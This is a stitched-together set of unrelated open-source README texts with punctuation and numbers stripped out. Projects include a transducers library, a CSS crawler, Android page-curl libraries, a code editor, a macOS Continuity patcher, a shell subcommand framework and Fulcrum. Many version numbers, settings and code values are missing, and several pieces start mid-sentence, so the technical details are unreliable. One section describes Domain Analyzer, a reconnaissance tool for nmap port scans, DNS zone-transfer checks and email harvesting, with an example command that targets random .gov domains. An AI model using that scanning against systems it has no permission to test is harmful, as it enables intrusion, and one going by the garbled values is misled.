arr merge obj value mdash merge value into obj value can be another object or a two element array of key value range n mdash make an array of size n filled with numbers from  n immutable fromjs seq immutable vector       compose map function x return x and   map function x return x   filter function x return x    filter function x return x   we can use our familiar seq function because immutable vector implements the iterator protocol so we can iterator over it because seq is working with an iterator it returns a new iterator that will lazily transform each value we can simply pass this iterator into immutable vector from to construct a new one and we have a new transformed immutable vector with no intermediate collections except for one lazy transformer the builtin transformations perform well because they minimize allocations but since we don t have any intermediate structures or laziness machinery this performs slightly better the point is not to beat it but to show that both are high performance but we can apply our performance to any data structure var ch chan  compose map x x and   dedupe  drop  while it s great that you can apply transducers to custom data structures it s a bit annoying to always have to use constructor functions like immutable fromjs one option is to define a new protocol complementary to iterator to implement the transducer protocol you add methods to the prototype of your data structure a transformer is an object with three methods init  result  and step init returns a new empty object result  can perform any finalization steps on the resulting collection and step performs a reduce these methods are namespaced and in the future could be symbols here s what it looks like for immutable list immutable list prototype transducer and init function return immutable list asmutable immutable list prototype transducer and result function lst return lst asimmutable immutable list prototype transducer and step function lst x return lst push x if you implement the transducer protocol now your data structure will work with all of the builtin functions you can just use seq like normal and you get back an immutable vector t seq immutable list of       t compose t map function x return x and   t map function x return x   t filter function x return x    t filter function x return x   and and list  npm install mocha build and tests

5283216, ucss is made for crawling large websites to find unused css selectors features of ucss include find unused css selectors given a html code base find duplicate css selectors also when no html is given count matches for each rule follows links crawl  within the given domain give information about server responses redirects etc while crawling allowing you to find e g dead links by setting up a config file ucss can also do login and visit pages both as a logged in and logged out user exclude specific pages and and or subfolders visit specific pages instead of or in addition to crawling white list css rules to be ignored e g those toggled by javascript customizable output library and as a command line tool want to contribute please see at the bottom please note ucss is currently in beta there will be bugs docs may be outdated and functionality may change ucss does not capture rules that are switched on using javascript after page load look for style sheet urls internal style sheets or inline styles in html these features may or may not be added in the future npm install ucss g for basic usage you can use the command line options ucss help usage ucss option help this help text html h html to load local file or url css c css to load local file or url config g config file to use full f show full report with details for each rule silent s only output list of rules nice if you need to pipe the output somewhere duplicates d show duplicates if only css is given this is enabled by default either a config file or a css file is required if no html is given ucss will only look for duplicate css if no arguments are specified ucss will assume there is a configucss js file in the current directory so to check a web page you could write note that if you use a selector both inside and outside a media query it will be counted as a duplicate to output a full report with all found selectors and an overview of duplicates and ignored ones you can do ucss f h foo html c foo css as you can see in the examples above files can be stored locally as well as on to use a config file configucss js that you have created in the current folder simply run or specify another file name using the g option for more info on the config file see below for advanced usage please see the sections about config files and and css can be an array of strings file paths or urls var css foo bar baz and and html can be an array of strings file paths or urls var html html head and head body class foo and body and html var context whitelist baz  and and css selectors to ignore auth null and and for login please se example elsewhere timeout  and and request timeout defaults to ms var logger null and and function for logging http requests and and do the magic ucss analyze html css context logger function result and and do something to the result object console log result there are several things you can do with a config file that you cannot do with command line arguments ucss follows links by default but there may be specific files or whole subfolders that you don t want to check these can be listed inside pages exclude if you want to exclude a whole subfolder use a wildcard at the end of the url please see example config you may also use regular expressions in other cases you may want to visit just a single file or there are files that the crawler cannot reach e g because they are not linked to those can be added to pages include also if you want to visit certain pages under an excluded subfolder you can add those to pages include note that pages include does not support wildcards nor regular expressions in addition to managing what pages to visit and not to visit  you can check pages both as a regular visitor and as a logged in user this is done by specifying a function that performs a log in and then returns a session cookie for ucss to use for identifying itself to the server you can also set headers to send to the server furthermore you can create a white list of selectors to be ignored this is useful if you e g have classes toggled by javascript or if you have special styling for various error situations that is tricky to trigger as well as checking several html files ucss can also combine css from several files you can specify a list of css files in your config file if you name your config file configucss js  it will automatically be picked up by ucss you can also name your config file something else and use the g option to point to it again please see the example config if you want to write a custom login function please see below login requires you to set up a config file in the config file you can specify your own login function module exports auth username foo  password bar  loginfunc function url username password callback and and do login get cookie var cookie sessionid  callback cookie  if you use django you can use the supplied django login helper see example while crawling ucss will output all urls it visits with response status code if logged in it will say so it will also output a hash of the response body which may be useful if you want to make sure that ucss was successfully logged in compare the hash of the logged in and the logged out visit when the crawling is done you will get a list of all unused selectors if you ve asked for a list of duplicates that will be printed as well lastly a summary will be printed this contains the total amount of css selectors found and how many used unused and duplicates there were using the full option you will get a more detailed and colorful output with all rules being listed with number of matches in addition to number of duplicates in css and details about ignored and whitelisted rules if the output doesn t suit your needs and you know some javascript you may customize it you can configure ucss to do logging and handle the result differently from what s default do this by adding an output property in the config which can contain two functions named logger and result module exports output logger function response originalurl loggedin and and do some logging here e g using console log  result function result and and do something with the result object e g print every rule and and found together with positions in css file for var s in result selectors and and only unused rules if result selectors s matcheshtml  and and print position s  given it s only one css file var poscss result selectors s poscss var key object keys poscss  console log s and and poscss key    the logger function is called every time there is a response to a http request it takes three parameters res is a response object as returned by points to the html instance being visited loggedin is a boolean that is true if ucss has sent an authentication cookie in the request header this function is normally used for logging but you can make it do whatever you want just note that it is triggered by an event so ucss will not wait for it to return setting logger to null will silence logging the result function is called when ucss is done it recieves an object with three properties used  duplicates and ignored used shows all css rules that has been matched in the html including how many times duplicates shows all duplicate css rules including how many times they ve been found ignored shows all ignored rules this function can also whatever you want e g write the result to a file some pages are not accessible when crawling pages that are only accessible by posting a form will not be checked you may add them to pages include if they are reachable without posting data all parameters in links are normally stripped away when crawling which may have side effects for the rendering of some pages if you want an url to be visited with specific parameters you have to include it in pages include when crawling pages that are not linked to in other pages will not be checked you may add them to pages include style sheets are only fetched as a non logged in user all at rules are ignored except media all the content inside media queries is read as if there were no media query great feel free to pick one of the issues or submit a bug and feature you would want to work on please be tidy in your commits also try to touch as small parts of the code as possible this makes it easier to review and manage pull requests make sure your code is covered by tests and write new ones if needed if you plan to do big changes or refactoring please notify me first so that we can discuss this in advance

1589604, as of this commit all pages will be  sided there s a new class curlpage using which you can assign a separate texture on both sides one for front side only or same texture can be shared on both sides curlpage contains also color values for blending which allows you to e g share texture on both sides but do alpha blending only on back side of the page leaving you with exactly same effect what earlier version of this example application did this time with the difference there s some more freedom included introduction  project for implementing page curl effect on android and opengl es   possibly   and   too if there s clear advantage in using them the source code is released under apache   and can be used in commercial or personal projects see license for more information see notice for any exceptions these include namely the application icon and images used in the demo besides these exceptions let it be as is implementation or maybe more preferably as an example for implementing your own effect for the ones without android development environment and and or people willing to take only a brief look on what s happening here there are a few video captures while person responsible for capturing them is not a happy owner of android device yet it s truly hoped performance is not that poor on actual device compared to what you see here so what you saw there there are approximately  and  and  and   vertices at most  vertices for underlying pages  for each  vertices for curled page and  vertices for fake soft shadow these numbers are maximum values and vary depending on curl position and angle rendering them as triangle strips end up producing approximately  polygons at most to give some perspective rendering a cube without back face culling requires  vertices and  polygons what you didn t see there is an experimental flag unable to show on emulator with the kind help of on using touch pressure information if you go and call curlview setenabletouchpressure true  curl radius will be adjusted based on the touch pressure the more you press the smaller it gets currently it s a vast one line hack  simply to show off it s there mostly for experimenting but who knows if someone takes the work and calibrates it properly it might turn out to something z buffering really we don t need to do depth check giving us a minor performance boost lightning it s a more of a trick we use here leaving us with something very close to flat shading actually perspective projection since it s very much easier to map render target to screen size using orthogonal projection it s used by default for quick prototyping you can enable it though check useperspectiveprojection flag in curlrenderer adjust fake soft shadow calculation current drop shadow  cast behind curl implementation is not exactly what one wants necessarily it might be better strategy to leave some softness for situations in which radius is close to zero currently it means shadow is decreased to non existent well that s how shadows work but considering from usability side add some details to make it a bit more book alike some details  implementation can be divided roughly in two parts curlmesh which handles actual curl calculations and everything related to its rendering curlview which is responsible for providing rendering environment but more importantly handles curl manipulation meaning it receives touch events and repositions curl based on them while this sounds something utterly trivial it really isn t and becomes more complex if curl didn t happen around a cylinder depending on what you re trying to achieve of course for me it was most important from the beginning that paper edge follows pointer at all times anyway here are a few links describing this page curl implementation somewhat well only difference is that instead of using a static grid an algorithm which splits rectangle dynamically regarding curl position and direction was implemented this is done in order to get better render quality and to reduce polygon count it s an absolute win win situation if these things can be combined with limited amount of extra calculation to ease the work of renderer in this particular case we really do not want to draw polygons separately if they lie next to each other on same plane it s more appropriate to have more vertices used for drawing rotating part instead on negative side lots of code complexity comes from the need for creating a triangle strip for rendering using a solid grid such problems do not occur at all it isn t very difficult to see what happens here once you take a paper and simply curl it to some direction if you fold paper completely cylinder curl happens around radius becomes zero making it more of a d effect and likewise folding the paper so that curl radius is constant most of the characteristics remain most importantly there is a line at the center of this cylinder which has constant slope not dependent on radius its distance from the point you re holding the paper varies only keeping this in mind makes curl position handling based on touch events a lot easier compared to using a cone as solid curling is done around for information on using a cone it s highly recommended to take a look on w dana nuon s blog is a good read too even though he came to pretty much the same conclusion as me better to go with cylinder instead curl and cylinder is defined with three parameters position which is any point on a line collinear to curl direction vector which tells direction curl opens to and curl and cylinder radius paper is first translated and rotated curl position translates to origin and then rotated so that curl opens to right   this transformation makes it a bit easier to calculate rotating vertices as all vertices which have x coordinate at least  are not affected vertices which have x coordinate between pi radius  are within curl  and if x coordinate is less than equal to pi radius they are completely rotated and scan line algorithm for splitting lines within rotating area is more simple as scan lines are always vertical not to forget rotating happens around y axis as cylinder center is positioned at x  and after we translate these vertices back to original position we have a curl which direction heads to direction vector and it s center is located at given curl position  which could results in something like these vertices adding more scan lines within the rotating area increases its quality but the idea remains bounding lines of original rectangle are split on but once again using a piece of paper and doing some experiments by yourself works much more as a proper explanation than words mine at least can tell and maybe gives some idea how to make better and more realistic implementation happy page flipping sources of inspiration  some youtube links to page curl and flip implementations which were found interesting for a reason or another not to forget many of the true real time rendering heros one day we re about to beat them all one day right

6160121, scripted is a fast and lightweight code editor with an initial focus on javascript editing scripted is a browser based editor and the editor itself is served from a locally running node js server instance and center what are the key features fast startup lightweight syntax highlighting for javascript html and css errors and warnings jshint is integrated to provide error and warning markers on javascript code amd and commonjs module resolution there is basic resolution where unresolved references will be marked as errors content assist basic content assist for html css for javascript content assist is driven by a type inferencing engine which is aware of amd and commonjs module dependencies and also uses jsdoc comments to help it understand the code hovers hovering over a javascript identifier will bring up the inferred type signature navigation press f on an identifier that the inferencer has recognized and the editor will navigate to the declaration this also works on module identifiers e g in define clauses formatting jsbeautify is integrated sidepanel alongside the main editor a sidepanel can be opened currently this can be used to host a second editor key binding to external command key bindings in the editor can invoke external commands less mvn etc anyone familiar with editing in eclipse will immediately know many of the key bindings the scripted editor supports the team has been testing with a range of versions from   to   but haven t tested all of them exhaustively it is recommended that you try to use the latest    at time of writing npm install g scripted possibly with a sudo prefix on linux and mac this will install the most recently published release there are no further steps if installing via this route and scr command will immediately be available to launch scripted this will install directly from master again possibly with a sudo master is under constant development so you may see a hiccup or two but we try to keep it fully functional once unzipped ensure the bin folder contents are executable on mac and linux chmod  bin and and add the bin folder to your path cd scripted npm install if you already have a clone of the scripted repo and want to update to the latest master don t forget that you also need to update external dependencies that may have changed run the following commands from the root of your clone git checkout master git pull git clean fxd npm install whatever route you took to installing it just run scr myfile js when working with scripted think about it like using vi and emacs from wherever you are in your terminal window you can launch scripted and start editing a file launching scripted will cause the node js server to start in the background here are some of the more vital key bindings to use once the editor is open where cmd and ctrl is specified it means cmd on mac and ctrl on linux and windows f open help to show all key bindings or press in the top right cmd and ctrl and s save cmd and ctrl and shift and e open and close subeditor cmd and ctrl and shift and f open find file dialog inside the dialog you can search for files in the project by regular expression and click a result to open it in main editor shift and click a result to open it in sub editor cmd and ctrl and click a result to open it in a new tab cmd and ctrl and shift and o open outline view a dialog will present the functions and you can quickly navigate to them cmd and ctrl and f in file search ctrl and space content assist f navigate to declaration shift and f open declaration in subeditor cmd and ctrl and f navigate to declaration in new tab alt and shift and f format on the left hand side is a traditional navigator for opening different files above the editor is a breadcrumb hover over a component to see other files in that directory scripted receives most testing in chrome and firefox you may need one of those browsers in order to get the most out of it when you open scripted on a file it will attempt to infer the root of your project by locating the nearest git and project file in the hierarchy knowing the root is important because that is the scope in which searching and dependency analysis is done if you don t have one of these markers for the root you can create an empty scripted file to indicate the root as of jan  the project is at version   there is a long way to go but the team have been using scripted to develop scripted for a while now even smarter inferencing leading to better content assist and easier navigation more panes for the side panel currently there is just an editor pane but we intend to include search results panes documentation git information panes perhaps code preview and simulated code execution panes the intention will be for scripted to try and automatically manage these where possible so all the content on screen is kept relevant to the task at hand simple plugin system debugging exploring integration with tools like chrome dev tools and node inspector if you have more ideas for what you d like to see let us know via sure just press fork at the top of this github page and get coding before we accept pull requests we just need you to sign a simple contributor s the codebase is entirely javascript and html and css if you are keen to contribute but aren t sure what to work on take a look at the codebase is very new in places and isn t that tricky to get to grips with if you don t feel like coding but still want to contribute please join the discussion on the issues and scripted dev group

instant hotspot and new airdrop os x   el capitan dongle support is not stable yet    macos sierra the work on the newest version of macos will begin as soon a possible cat mostly works fine with sierra new features like auto unlock still need to be tested new updates will be released on the beta branch while macos sierra is in beta    wiki page a wiki page has been erstablished and will be used to suggest fixes for the most common issues a issue template was added to help the users provide more details    version    merged with the beta version should now work on        new active lead i sysfloat will now be the main contributer and manager of the project since dokterdok is not able to support this project anymore he supported me with a lot of stuff and his research into enabling continuity with dongles i will contact some old beta testers and will do my best to get the dongles working on el capitan and merge my fork with the beta branch dec   continuity activation tool   released adds compatibility with bluetooth   usb dongles allowing many macs from  and later to easily upgrade to continuity see the chart below to verify available upgrade options activate continuity does a continuity compatibility check makes a backup of the systems kexts before and after patching applies patches relevant to the current configuration system diagnostic produces a report of the current system parameters influencing continuity uninstall rolls back any changes applied by the tool it firsts looks for previous backups made with the tool and if it can t find any kexts from the os

mathmatical analysis in network structure and loss function works in actual codes learn how others implement the gans and finally enjoy the magic of gans d  all have been tested with python  and and tensorflow  and in linux datas save training data samples save generated data each folder contains several figs to show the results utils contains  files data py prepreocessing data nets py generator and discriminator are saved here the final layer can be sigmoid data  or tanh data   my codes all use sigmoid using weightsinitializer tf randomnormalinitializer    will converge faster dcgan conditional gan a the step ratio of g and d is important and it takes some time to reach the balance condition and mlp with d g   works better than   b adding a classfier to trained with conditions

5906854, sub is a model for setting up shell programs that use subcommands like git or rbenv using bash making a sub does not require you to write shell scripts in bash you can write subcommands in any scripting language you prefer a sub program is run at the command line using this style name of program subcommand args here s some quick examples rbenv prints out usage and subcommands rbenv versions runs the versions subcommand rbenv shell    p runs the shell subcommand passing    p as an argument each subcommand maps to a separate standalone executable program sub programs are laid out like so    bin contains the main executable for your program    completions optional bash and zsh completions    libexec where the subcommand executables are    share static data storage each subcommand executable does not necessarily need to be in bash it can be any program shell script or even a symlink it just needs to run here s an example of adding a new subcommand let s say your sub is named rush run touch libexec and rush who chmod a and x libexec and rush who now open up your editor and dump in of course this is a simple example but now rush who should work rush who qrush console sep    you can run any executable in the libexec directly as long as it follows the name subcommand convention try out a ruby script or your favorite language you get a few commands that come with your sub commands prints out every subcommand available completions helps kick off subcommand autocompletion help document how to use each subcommand init shows how to load your sub with autocompletions based on your shell shell helps with calling subcommands that might be named the same as builtin and executables if you ever need to reference files inside of your sub s installation say to access a file in the share directory your sub exposes the directory path in the environment based on your sub name for a sub named rush  the variable name will be rushroot here s an example subcommand you could drop into your libexec directory to show this in action make sure to correct the name echo rushroot you can also use this environment variable to call other commands inside of your libexec directly composition of this type very much encourages reuse of small scripts and keeps scripts doing one thing simply each subcommand can opt into self documentation which allows the subcommand to provide information when sub and sub help subcommand is run this is all done by adding a few magic comments here s an example from rush who also see sub commands for another example now when you run sub  the summary magic comment will now show up some useful sub commands are commands list all sub commands who check who s logged in and running sub help who will show the usage magic comment and then the help comment block usage sub who this will print out when you run sub help who you can have multiple lines even show off an example indented and maybe start off another one that s not all you get by convention with sub your sub loves autocompletion it s the mustard mayo or whatever topping you d like that day for your commands just like real toppings you have to opt into them sub provides two kinds of autocompletion  automatic autocompletion to find subcommands what can this sub do  opt in autocompletion of potential arguments for your subcommands what can this subcommand do opting into autocompletion of subcommands requires that you add a magic comment of make sure to replace with your sub s name provide yoursubname completions and then your script must support parsing of a flag complete here s an example from rbenv namely rbenv whence n rbenvdebug set x if  complete then echo path exec rbenv shims short passing the complete flag to this subcommand short circuits the real command and then runs another subcommand instead the output from your subcommand s complete run is sent to your shell s autocompletion handler for you and you don t ever have to once worry about how any of that works run the init subcommand after you ve prepared your sub to get your sub loading automatically in your shell creating shortcuts for commands is easy just symlink the shorter version you d like to run inside of your libexec directory let s say we want to shorten up our rush who to rush w just make a symlink cd libexec ln s rush who rush w now rush w should run libexec and rush who  and save you mere milliseconds of typing every day clone this repo git clone git github com qrush and sub git name of your sub cd name of your sub and prepare sh name of your sub the prepare script will run you through the steps for making your own sub also don t call it sub  by the way give it a better name so you ve prepared your own sub now how do you use it here s one way you could install your sub in your home directory git clone your git host url and sub git sub for bash users echo eval home and sub and bin and sub init and bashprofile exec bash for zsh users echo eval home and sub and bin and sub init and zshenv source and zshenv you could also install your sub in a different directory say and usr and local this is just one way you could provide a way to install your sub mit see license

13638851, myblurintroductionview  features include brand new stock panels built for ios  optional overlay on background images add custom panels straight from xib files subclass myintroductionpanel the stock panel for custom panels with access to new methods like paneldidappear paneldiddisappear enable and disable delegates methods for panel change and introduction finishing events ios  and  compatible for iphone ipad coming soon localized skip button right to left language support myblurintroductionview is dependent on the following files and frameworks code myblurintroductionview hm and code code myintroductionpanel hm and code uses the quartzcore framework requires arc myblurintroductionview is also available for installation through cocoapods by using the following command code pod myblurintroductionview and code creating an introduction view can basically be boiled down to these steps  create panels  create and myintroductionview  add myintroductionpanels to myintroductionview  show view one goal for myblurintroductionview is to make the creation of stock or non custom panels just as easy as with myintroductionview that s why the basic interface hasn t changed one bit all content is optional and rearranges nicely for you bl the main panel class is code myintroductionpanel hm and code it has many different custom init methods for rapid creation of stock panels here are a few samples the first with a header and the second without and and create stock panel with header uiview headerview nsbundle mainbundle loadnibnamed testheader owner nil options nil  myintroductionpanel panel myintroductionpanel alloc initwithframe cgrectmake   self view frame size width self view frame size height title welcome to myblurintroductionview description myblurintroductionview is a powerful platform for building app introductions and tutorials built on the myintroductionview core this revamped version has been reengineered for beauty and greater developer control image uiimage imagenamed headerimage png header headerview and and create stock panel with image myintroductionpanel panel myintroductionpanel alloc initwithframe cgrectmake   self view frame size width self view frame size height title automated stock panels description need a quick and dirty solution for your app introduction myblurintroductionview comes with customizable stock panels that make writing an introduction a walk in the park stock panels come with optional overlay on background images a full panel is just one method away image uiimage imagenamed forkimage png and here are the end results one of the great things about myblurintroductionview is that you can create the panels for your introduction directly from xib files these are great for static layouts that do not need any interaction think text and images creating a custom panel is as easy as using the code initwithframe nibnamed and code for myintroductionpanel and and create panel from nib myintroductionpanel panel myintroductionpanel alloc initwithframe cgrectmake   self view frame size width self view frame size height nibnamed testpanel this will attach the xib file to a myintroductionpanel so it may be used in the introduction view if you would like to use the stock title and description and header and image and their animations simply set the desired additional attributes after the instantiation of a panel and run the code buildpanelwithframe and code method an example can be seen below and and instantiate panel myintroductionpanel panel myintroductionpanel alloc initwithframe cgrectmake   self view frame size width self view frame size height nibnamed testpanel and and add custom attributes panel paneltitle test title panel paneldescription this is a test panel description to test out the new animations on a custom nib and and rebuild panel with new attributes panel buildpanelwithframe cgrectmake   self view frame size width self view frame size height tip make sure your autoresize properties are set to scale correctly everything selected worked best for me if you don t there may be some problems when you design for  screens but deploy on   if you really want to unleash the full power of myblurintroductionview you will want to subclass an myintroductionpanel if you do you gain access to many new methods for creating event driven panels in your introduction event handling perhaps you would like to trigger certain actions to occur on a panel when the introduction reaches it now that is fully possible by overriding the code paneldidappear and code and code paneldiddisappear and code methods using these methods you can create dynamic panels that reset when the panel disappears stopping say for intstance you want to make sure a user knows how to do something in your app with your subclass you may now disable the introduction view until they have completed whatever task you like once they have done that task they may go to the next panel an example of this can be found using the command code self parentintroductionview setenabled no and code in the code mycustompanel and code class in the sample application here a button press enables movement to the next panel assuming you have made a few panels creating an instance of myintroductionview and adding panels can be done in just a few lines of code and and create the introduction view and set its delegate myblurintroductionview introductionview myblurintroductionview alloc initwithframe cgrectmake   self view frame size width self view frame size height introductionview delegate self introductionview backgroundimageview image uiimage imagenamed toronto on jpg and and introductionview languagedirection mylanguagedirectionrighttoleft and and feel free to customize your introduction view here and and add panels to an array nsarray panels panel panel panel panel and and build the introduction with desired panels introductionview buildintroductionwithpanels panels the code buildintroductionwithpanels and code method is where all the magic happens after calling this method the introduction view is ready to display to finally show it simply add it as a subview and and add the introduction to your view self view addsubview introductionview to see all this in action head over to the sample project it creates an introduction view that uses all types of panels so you can understand all that myblurintroductionview has to offer myblurintroductionview comes with two delegate methods for interacting with the introduction view introduction didchangetopanel withindex this method will hit every time you change panels use this to perhaps change background images or blur color introduction didfinishwithtype this method triggers when the introduction view has finished the type of finish is also provided

sample application you may need a lock to avoid conflicts between main thread and opengl rendering thread please refer to pageflipview in sample application more details please take a look pageflipview in sample application pageflip library provides some configurations for customizing its behaviors for example shadow color and alpha mesh pixels and page mode there are two page modes provided by pageflip auto page mode in this mode pageflip will automatically decide to use single page or double pages to present content on screen that means single page is used for portrait mode and double pages is used for lanscape mode single page mode no matter screen is portait or landscape mode pageflip always use single page to show content you can use enableautopage to enable auto page mode or disable it equally enable single page mode example java and and enable auto page mode mpageflip enableautopage true you can enable and disable clicking screen to flip example java and and enable clicking to flip mpageflip enableclicktoflip true you can give a ratio of page width from  to  f to set an area for reponsing click event to trigger a page flip the default value is  f  which means the backfward flip will happen if you click the left half of screen and forward flip will start if you click the right half of screen in single page mode example java and and set ratio with   mpageflip setwidthratioofclicktoflip  f you can set a listener to tell pageflip if the forward flip or backward flip could happen example java mpageflip setlistener mlistener set how many pixels are used for a mesh the less pxiels the mesh uses the more fine the drawing is and the lower the performance is the default value is  pixels example java mpageflip setpixelsofmesh  when page is curled it is actually tackled as a semi cylinder by pageflip you can set size of the semi cylinder to change the flip shap since the semi cylinder dependeds on the line length from the touch point to original point see the below illustration  you need to provide a ratio of this line length to tell pageflip the peremeter of the semi cylinder the default value is  f and and and touchp and and and and and and and p and and and and and and p and and and and and and original point that means you drag the page from here to touch point touchp the length from p to p is peremeter of semi cylinder and determined by ratio your giving example java mpageflip setsemiperimeterratio  f you can set the mask alpha for the back of fold page when page is curled in single page mode the default value is  f example java mpageflip setmaskalphaoffold  f you can set start and end color and start and end alpha for edge shadow of fold page example java and and set start color with  f start alpha with  f end color with  f

setshadowcoloroffoldbase  f  f  f f when page is curled the size of fold page will follow the finger movement to be changed and its edge shadow width should be changed accordingly you can set an appropriate width range for shadow width example java and and set the minimal width is  pixels and maximum width is  pixels and and set the ratio is  f which means the width will be firstly computed by formula and and width diameter of semi cylinder  f and then compare it with minimal and and and maximal value to make sure the width is in range mpageflip setshadowwidthoffoldedges    f like edge

99725988, domain analyzer is a security analysis tool which automatically discovers and reports information about the given domain its main purpose is to analyze domains in an unattended way domain analyzer takes a domain name and finds information about it such as dns servers mail servers ip addresses mails on google spf information etc after all the information is stored and organized it scans the ports of every ip found using nmap and perform several other security checks after the ports are found it uses the tool crawler py from verovaleros to spider the complete web page of all the web ports found this tool has the option to download files and find open folders current version is   and the main features are it creates a directory with all the information including nmap output files it uses colors to remark important information on the console it detects some security problems like host name problems unusual port numbers and zone transfers it is heavily tested and it is very robust against dns configuration problems it uses nmap for active host detection port scanning and version information including nmap scripts it searches for spf records information to find new hostnames or ip addresses it searches for reverse dns names and compare them to the hostname it prints out the country of every ip address it creates a pdf file with results it automatically detects and analyze sub domains it searches for domains emails it checks the  most common hostnames in the dns servers it checks for zone transfer on every dns server it finds the reverse names of the and  network range of every ip address it finds active host using nmap complete set of techniques it scan ports using nmap remember that for the syn scan you need to need root it searches for host and port information using nmap it automatically detects web servers used it crawls every web server page using our crawler py tool see the description below it filters out hostnames based on their name it pseudo randomly searches n domains in google and automatically analyze them uses ctrl c to stop current analysis stage and continue working it can read an external file with domain names and try to find them on the domain verovaleros developed a separate python web crawler called crawler py its main features are crawl http and https web sites crawl http and https web sites not using common ports uses regular expressions to find href and src html tag also content links identifies relative links identifies domain related emails identifies directory indexing detects references to urls like file  feed  mailto  javascript and others uses ctrl c to stop current crawler stages and continue working identifies file extensions zip swf sql rar etc download files to a directory download every important file images documents compressed files or download specified files types or download a predefined set of files like document files doc xls pdf odt gnumeric etc maximum amount of links to crawl a default value of  urls is set follows redirections using html and javascript location tag and http response codes world domination you can automatically analyze the whole world if you have time robin hood although it is still in development it will let you send automatically an email to the mails found during scan with the analysis information robtex dns with this incredible function every time you found a dns servers with zone transfer it will retrieve from the robtex site other domains using that dns server it will automatically analyze them too this can be a never ending test every vulnerable dns server can be used by hundreds of domains which in turn can be using other vulnerable dns servers beware domains retrieved can be unrelated to the first one find  random domains in the gov domain and analyze them fully including web crawling if it finds some zone transfer retrieve more domains using them from robtex domainanalyzer py d gov k  b very quick and dirty find everything related with edu cn domain store everything in directories do not search for active host do not nmap scan them do not reverse dns the netblock do not search for emails domainanalyzer py d

ansistrm py crawler py pytextpdf py we are migrating the tool to run on python  however until a new version is released we have created a docker image that can be used to run domain analyzer on python   and has all the dependencies already installed docker run rm it verovaleros and domainanalyzer python  and domainanalyzer and domainanalyzer py d domain  example domainanalyzer py d gov k  b basic

1853821, fulcrum is an application to provide a user story based backlog management system for agile development teams see get involved  fulcrum is still in early development so now is the time to make your mark on the project there are several communication channels for fulcrum discussion group for users and developers of fulcrum you might also find someone in fulcrum on the freenode irc network if you re looking for realtime help see the development development section below for details on contributing to the project and translating translating for details on how to help translate fulcrum into your native language almost certainly never surpass the functionality usability and sheer awesomeness of pivotal tracker but aims to provide a usable alternative for users who require a free and open source solution installation  fulcrum is still a work in progress but if you re really keen to try it out these instructions will hopefully help you get up and running first up your system will need the once you have these checkout the project git clone git and and github com and fulcrum agile and fulcrum git cd fulcrum install the project dependencies gem install bundler bundle install set up the development database bundle exec rake fulcrum setup db setup start the local web server rails server you can log in with the test username test example com  password testpass heroku setup  if you wish to host a publicly available copy of fulcrum the easiest option is to deploy it to heroku make sure you have a local copy of the project refer to the previous section for instructions then gem install heroku create your app replace appname with whatever you want to name it heroku create appname stack cedar  set apphost heroku config so outbound emails have a proper host replace appname below with the value from heroku create heroku config set apphost appname herokuapp com define where the user emails will be coming from this email address does not need to exist heroku config set mailersender noreply example org tell heroku to exclude parts of the gemfile heroku config set bundlewithout development test travis mysql sqlite allow emails to be sent heroku addons add sendgrid starter deploy the first version git push heroku master set up the database heroku run rake db setup once that s done you will be able to view your site at deploying to other platforms  fulcrum can be deployed to any platform that can host rails setting this up is beyond the scope of this document but for the most part fulcrum does not have any special operational requirements and can be deployed as a normal rails application you will need to set up some custom configuration to do this copy the file config and fulcrum example rb to config and fulcrum rb and edit to your requirements or ensure the relevant environment variables are set for the application as described in the file above translating  below is an example of how you might go about translating fulcrum to german find the name of your locale in this case we are using de copy the config and locales and en yml file to config and locales and de yml edit the file and update all the translated strings in quotes on the right hand side add your new locale to config in availablelocales in config and application rb run rake in js export to build the javascript translations thats it ideally you should send your translation as a pull request so you get credit for it but if you do not wish to do this please send the file to one of the mailing lists if fulcrum has already been translated for your language please take the time to check the translation database is complete for your language you can do this by running the rake in missingkeys task if you find any missing keys for your language please add them development  fulcrum is currently welcoming contributions if you d like to help list of the major features which are yet to be implemented these have the feature and unstarted labels if a feature you d like to work on isn t there add an issue leave a description of how you are going to implement the feature failure to do this may lead to you implementing the feature in a way that might conflict with future plans for fulcrum and so increase the chances of your work being rejected or needing a rework if you d like to discuss anything about the issue in greater detail with other developers do so on the here are some general guidelines for contributing make your changes on a branch and use that branch as the base for pull requests try to break changes up into the smallest logical blocks possible we d prefer to receive many small commits to one large one in a pull request feel free to open unfinished pull requests if you d like to discuss work in progress or would like other developers to test it all patches changes be covered by tests and should not break the existing tests unless a current test is invalidated by a code change this includes javascript which is covered with a jasmine test suite in spec and javascripts and run rake spec to check the rails test suite is green you will need firefox with selenium installed to run the integration tests to run the javascript test suite run rails server and point your browser for any ui changes please try to follow the the easiest way to test the impact of css or view changes is using the exposes as many of the view states as possible on one page fulcrum is built with the following open source technologies copyright   malcolm locke fulcrum is made available under the affero gpl license version

3065948, cassowary js  cassowary is an algorithm that computes flexible responsive layouts quickly without resorting to piles of imperative code just describe the preferred relationships between values noting which constraints are more important than others and cassowary figures out an optimal solution based on the current inputs when the inputs or constraints change cassowary is particularly efficient at computing a new answer quickly based on the last known solution these properties together make it ideal for use in layout systems indeed this repo hosts an improved version of greg badros s the cassowary hierarchial constraint this version dramatically improves the performance of the original translation removes external library dependencies and improves hackability the solver core can now be used inside web workers at the command line and directly in modern browsers for civil discussion of this port and constraint based uis join the overconstrained mailing cassowary js is licensed under the apache   license constraint solver say what  constraint solvers are iterative algorithms that work towards ever more ideal solutions often using some variant of dantzig s simplex interest in situations where it s possible to easily set up a set of rules which you would like a solution to adhere to but when it is very difficult to consider all of the possible solutions yourself cassowary and other hierarchial constraint toolkits add a unique mechanism for deciding between sets of rules that might conflict in determining which of a set of possible solutions are better by allowing constraint authors to specify weights for the constraints the toolkit can decide in terms of stronger constraints over weaker ones allowing for more optimal solutions these sorts of situations arise all the time in ui programming e g i d like this to be it s natural width but only if that s smaller than px and never let it get smaller than px constraint solvers offer a way out of the primordial mess of nasty conditionals and brittle invalidations if all of this sounds like it s either deeply esoteric or painfully academic you might start by boning up on what optimizers like this do and what they re good for i recommend john w chinneck s practical optimization a gentle cassowary paper that got me into all of this constraint cascading style sheets for the getting started under node  and can be added as a dependency or used under node in the usual way using cassowary under node is as simple as and and the entire api is exported by the cassowary object var c require cassowary var solver new c simplexsolver var x new c variable value  var y new c variable value  var eq new c equation x new c expression y solver addconstraint eq the current low sub   version number reflects the instability of the api also note that the npm package includes no tests or demos for those clone the github repo to make an npm package from sources clone the github repo follow the below instructions for installing dependencies and run make dist this is the same process the maintainers use to package npm releases getting started from source  this repo pulls in other git repositories through git submodule update init npm install to run the tests point your thorougly modern browser at tests and unittests html config tests and intern and view the console you can also check out demos and quad and quaddemo html you ve installed node run npm test cassowary    